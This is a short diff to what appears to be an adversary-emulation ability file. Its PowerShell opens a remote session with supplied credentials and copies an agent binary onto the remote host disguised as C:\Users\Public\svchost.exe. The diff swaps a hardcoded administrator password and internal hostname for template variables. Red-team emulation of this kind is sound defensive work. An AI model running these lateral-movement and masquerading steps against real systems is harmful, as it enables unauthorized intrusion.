@@ -12,10 +12,10 @@
       psh:
         command: |
           $job = Start-Job -ScriptBlock {
-            $username = "MOUNTAINPEAK\Administrator";$password = "P@ssw0rd";$secstr = New-Object -TypeName System.Security.SecureString;
+            $username = "#{host.user.name}";$password = "#{host.user.password}";$secstr = New-Object -TypeName System.Security.SecureString;
             $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
             $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
-            $session = New-PSSession -ComputerName "ip-172-16-87-56.ec2.internal" -Credential $cred;
+            $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
             Copy-Item -Path "sandcat.go-windows" -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
             Remove-PSSession -Session $session;
           };
